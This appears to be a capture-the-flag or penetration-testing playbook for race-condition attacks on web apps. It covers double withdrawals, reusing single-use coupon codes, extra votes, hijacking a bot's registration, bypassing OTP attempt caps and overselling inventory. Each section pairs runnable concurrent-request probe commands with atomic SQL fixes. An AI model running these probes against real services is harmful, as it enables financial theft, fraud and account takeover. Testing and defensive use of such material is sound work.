# Per-check playbook — balance, transfer, withdraw, redeem, code

The money and single-use resource playbooks. Same window shape, four different
sinks. The confirmation in every case is a serial-impossible state.

---

## 1. Balance / withdraw / transfer

### The window

```text
SELECT balance FROM accounts WHERE id = :uid     -- read
if balance >= amount:                             -- decide
    ... logging, receipt, fraud check ...          -- work inside the window
UPDATE accounts SET balance = balance - amount    -- write
```

### The serial-impossible outcome

- Two withdrawals of the full balance both succeed → net extracted = 2× balance.
- Balance column reads negative afterward.

### Probes

```bash
# serial baseline: one withdraw succeeds, second declines
python3 tools/web/race_probe.py --url "$BASE/api/withdraw" \
  --method POST --body '{"amount":100}' -H 'Cookie: session=...' \
  --baseline-count 3 --count 0 --no-barrier --challenge <name>

# the race: 10 overlapping withdraws of the full balance
python3 tools/web/race_probe.py --url "$BASE/api/withdraw" \
  --method POST --body '{"amount":100}' -H 'Cookie: session=...' \
  --concurrency 10 --count 10 --baseline-count 3 \
  --signature-mode status-length --write-ack --challenge <name>

# then read the state — the crossed value is the balance itself
curl -s -b 'session=...' "$BASE/api/account" | python3 -c 'import sys,json;print(json.load(sys.stdin)["balance"])'
```

A negative balance or two `200` responses where baseline gave one `200` + one
`4xx` is the confirm. Quote the balance value and both response statuses.

### Variants

- **Transfer A→B while transferring A→C**: same balance read, two debits.
- **Deposit racing withdraw**: withdrawal validated against pre-deposit
  balance, then the deposit lands — or the deposit is validated then the
  withdrawal zeroes the account first. Order matters; run both directions.
- **Currency/points conversion**: read rate, read balance, convert — two
  concurrent converts double the output.

### Defences / falsifiers

`UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ?` —
the atomic form. The probe signature: second overlapping request returns the
decline, balance never negative, `affected rows = 0` for the loser. `SELECT
... FOR UPDATE` blocks the second request visibly (higher latency on the
loser).

## 2. Redeem / coupon / single-use code

### The window

```text
SELECT used, reward FROM codes WHERE code = :c   -- read
if not used:
    grant_reward(user, reward)                    -- the effect
    UPDATE codes SET used = 1 WHERE code = :c    -- write, possibly after grant
```

### The serial-impossible outcome

The same code produces two grants — two inventory items, two point credits,
two `{"ok":true}` responses where serial gives `200` then `{"error":"used"}`.

### Probes

```bash
python3 tools/web/race_probe.py --url "$BASE/api/redeem" \
  --method POST --body '{"code":"XYZ"}' -H 'Cookie: session=...' \
  --concurrency 20 --count 20 --baseline-count 5 \
  --signature-mode status --write-ack --challenge <name>
```

Count the `200`s. Baseline: one. Win: two or more. Then check the granted
effect — inventory count, point total — to attribute it.

### Variants

- **Code + user scoping**: the code is global but the check reads
  `used_by = NULL`; racing two *different* sessions on the same code may both
  claim it (needs `--url-b` or two cookie jars — one session each).
- **Gift card / promo stack**: redeem two different codes that share a
  "one promo per order" check — the check reads the order's promo count.
- **Claim link with no code**: the object itself is the resource (invite link,
  airdrop). Same probe, no body field.

### Defences / falsifiers

`UPDATE codes SET used=1 WHERE code=? AND used=0` then read `ROW_COUNT()` —
the loser sees 0 rows and rejects. Unique constraint on `(code)` for a
per-user redemption table. Both close the window; a clean 409 on the loser is
the falsifier.

## 3. Vote / like / reaction limit

### The window

```text
SELECT count(*) FROM votes WHERE user_id = :u AND post_id = :p   -- read
if count < 1:
    INSERT INTO votes ...                                        -- write
    UPDATE posts SET score = score + 1                           -- tally
```

### The serial-impossible outcome

Two accepted votes from one account on one post; the post's score increments
twice.

### Probes

```bash
python3 tools/web/race_probe.py --url "$BASE/api/vote" \
  --method POST --body '{"post":1,"dir":1}' -H 'Cookie: session=...' \
  --concurrency 15 --count 15 --baseline-count 4 \
  --signature-mode status-length --write-ack --challenge <name>
curl -s "$BASE/api/post/1" | python3 -c 'import sys,json;print(json.load(sys.stdin)["score"])'
```

### Variants

- **Daily/period cap**: `votes_today < 10` — race 15 at once.
- **Negative vote then positive**: the check reads a stored direction; the
  flip window can leave score and stored vote inconsistent.
- **Downvote-cancel**: cancel and re-vote crossing leaves the count off by
  the flip amount.

### Defences / falsifiers

`UNIQUE(user_id, post_id)` — the canonical fix. Loser gets a constraint error.
Any read-modify-write on the score still needs the atomic `UPDATE posts SET
score = score + 1` to keep the tally right.

## 4. Registration uniqueness (the SSOS form)

### The window

```text
SELECT id FROM users WHERE email = :e            -- read
if not exists:
    INSERT INTO users (email, password) ...      -- write
```

### The serial-impossible outcome

Either two rows with the same email, or — the useful form — you win the race
against a *bot's own startup registration* and own the account it thinks it
owns.

### Probes

```bash
# hammer the register endpoint for the fixed bot account
for i in $(seq 1 40); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$BASE/api/register" \
    -H 'Content-Type: application/json' \
    -d '{"email":"student@domain","password":"mine123"}' &
done; wait
# then try logging in — your password working is the crossed state
curl -s -X POST "$BASE/api/login" -H 'Content-Type: application/json' \
  -d '{"email":"student@domain","password":"mine123"}'
```

The SSOS falsifier applies verbatim: the account is already registered with an
unknown random password → the instance is already consumed; a fresh instance is
required.

### Defences / falsifiers

`UNIQUE(email)` — the bot's registration, or yours, fails cleanly. A consumed
instance where your login fails is the stop condition.

## 5. OTP / attempt-counter race

### The window

```text
SELECT attempts FROM otps WHERE user = :u       -- read
if attempts < 5:
    UPDATE otps SET attempts = attempts + 1     -- increment
    if code == supplied: mark used, issue session
```

### The serial-impossible outcomes

- **Attempt-cap bypass**: more than 5 attempts accepted — each in-flight
  request read `attempts < 5` before any incremented.
- **Code-consume race**: the correct code burst-submitted issues two sessions.

### Probes

```bash
# attempt-cap: burst 20 wrong guesses where the cap is 5
python3 tools/web/race_probe.py --url "$BASE/api/verify-otp" \
  --method POST --body '{"code":"999999"}' -H 'Cookie: session=...' \
  --concurrency 20 --count 20 --baseline-count 6 \
  --signature-mode status --challenge <name>
# baseline: first 5 get "invalid", 6th+ get "locked". A win: attempts past the cap answered "invalid" not "locked".

# consume: burst the correct code
python3 tools/web/race_probe.py --url "$BASE/api/verify-otp" \
  --method POST --body '{"code":"123456"}' -H 'Cookie: session=...' \
  --concurrency 5 --count 5 --baseline-count 2 \
  --signature-mode raw-body --write-ack --challenge <name>
# two responses carrying two distinct session cookies is the crossed state.
```

### Defences / falsifiers

Atomic `UPDATE otps SET attempts = attempts + 1 WHERE attempts < 5` returning
rowcount, or the code-consumption update gated on `used = 0`. A lock message
arriving exactly at the cap under load is the falsifier.

## 6. Inventory / seat / slot

### The window

```text
SELECT stock FROM items WHERE sku = :s          -- read
if stock > 0:
    INSERT INTO orders ...
    UPDATE items SET stock = stock - 1          -- write
```

### The serial-impossible outcome

`stock = -1`, or two confirmed bookings for the last seat.

```bash
python3 tools/web/race_probe.py --url "$BASE/api/buy" \
  --method POST --body '{"sku":"last-seat"}' -H 'Cookie: session=...' \
  --concurrency 4 --count 4 --baseline-count 2 \
  --write-ack --challenge <name>
curl -s "$BASE/api/item/last-seat" | python3 -c 'import sys,json;print(json.load(sys.stdin)["stock"])'
```

Concurrency should match the stock: racing 20 buyers on stock 20 and seeing 21
confirmed is the win — the number is the attribution.

### Defences / falsifiers

`UPDATE items SET stock = stock - 1 WHERE sku = ? AND stock > 0` rowcount-gated;
`UNIQUE(seat_id)` on the bookings table.
